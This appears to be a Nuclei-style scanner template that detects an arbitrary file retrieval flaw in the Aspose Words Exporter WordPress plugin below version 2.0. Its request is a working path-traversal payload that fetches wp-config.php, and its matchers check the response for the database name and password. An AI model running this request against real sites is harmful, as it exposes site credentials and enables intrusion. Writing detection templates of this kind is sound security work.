id: aspose-words-file-download
info:
  author: 0x_Akoko
  description: The Aspose.Words Exporter WordPress plugin is affected by an arbitrary
    file retrieval security vulnerability.
  name: Aspose Words Exporter < 2.0 - Arbitrary File Retrieval
  reference:
  - https://wpscan.com/vulnerability/7869
  - https://wordpress.org/plugins/aspose-doc-exporter
  severity: high
  tags: wordpress,wp-plugin,lfi,aspose
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php'
